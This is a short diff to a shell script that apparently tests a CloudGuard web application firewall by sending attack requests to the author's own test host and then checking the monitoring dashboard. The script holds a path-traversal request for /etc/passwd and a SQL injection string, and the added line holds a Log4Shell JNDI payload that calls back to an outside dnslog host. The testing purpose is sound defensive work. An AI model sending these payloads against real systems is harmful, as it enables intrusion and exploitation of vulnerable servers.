@@ -60,6 +60,7 @@ curl -vvv https://www-${MYID}.cloudguard.rocks 2>&1
 # once asset is in place, new policy enforced by agent. lets cause some incidents
 curl -vvv "https://www-${MYID}.cloudguard.rocks/?param=cat+../../etc/passwd" 2>&1
 curl -vvv "https://www-${MYID}.cloudguard.rocks/?z=UNION+1=1" 2>&1
+curl "https://www-${MYID}.cloudguard.rocks/" -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
 
 # check at monitoring
 # https://portal.checkpoint.com/dashboard/appsec#/waf-monitor/high-and-critical-wlc/
